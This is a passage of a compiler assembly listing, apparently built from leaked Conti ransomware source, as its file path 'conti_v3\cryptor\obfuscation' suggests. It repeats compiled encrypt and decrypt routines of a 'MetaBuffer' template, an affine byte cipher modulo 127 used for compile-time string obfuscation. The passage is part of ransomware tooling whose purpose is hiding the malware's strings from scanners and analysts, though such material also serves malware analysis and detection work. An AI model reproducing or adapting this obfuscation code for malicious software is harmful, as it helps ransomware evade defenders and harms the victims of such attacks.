  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 2d	 imul	 r8d, ecx, 45		; 0000002dH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EP@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<79,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0EP@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0EP@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<79,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 4f	 imul	 r8d, eax, 79		; 0000004fH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 78	 add	 r8d, 120		; 00000078H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0EP@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<79,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0EP@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0EP@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<79,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0EP@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<79,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CJ@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0CJ@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<41,55,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 37	 sub	 eax, 55			; 00000037H
  00006	44 6b c0 1f	 imul	 r8d, eax, 31

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CJ@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<41,55,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0CJ@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0CJ@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<41,55,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 29	 imul	 r8d, eax, 41		; 00000029H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 37	 add	 r8d, 55			; 00000037H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0CJ@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<41,55,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0CJ@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0CJ@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<41,55,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0CJ@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<41,55,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 3c 00 00 00	 mov	 ecx, 60			; 0000003cH
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 2c	 imul	 r8d, ecx, 44		; 0000002cH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 65	 imul	 r8d, eax, 101		; 00000065H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 3c	 add	 r8d, 60			; 0000003cH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BB@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BB@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<17,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 5d	 sub	 eax, 93			; 0000005dH
  00006	44 6b c0 0f	 imul	 r8d, eax, 15

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BB@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<17,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BB@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BB@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<17,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 11	 imul	 r8d, eax, 17
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 5d	 add	 r8d, 93			; 0000005dH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BB@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<17,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BB@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BB@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<17,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BB@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<17,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BN@$0HA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BN@$0HA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<29,112,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 70 00 00 00	 mov	 ecx, 112		; 00000070H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 23	 imul	 r8d, ecx, 35		; 00000023H

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BN@$0HA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<29,112,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BN@$0HA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BN@$0HA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<29,112,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 1d	 imul	 r8d, eax, 29
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 70	 add	 r8d, 112		; 00000070H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BN@$0HA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<29,112,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BN@$0HA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BN@$0HA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<29,112,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BN@$0HA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<29,112,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BP@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BP@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<31,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 4b	 sub	 eax, 75			; 0000004bH
  00006	44 6b c0 29	 imul	 r8d, eax, 41		; 00000029H

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BP@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<31,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BP@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BP@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<31,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 1f	 imul	 r8d, eax, 31
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 4b	 add	 r8d, 75			; 0000004bH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BP@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<31,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BP@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
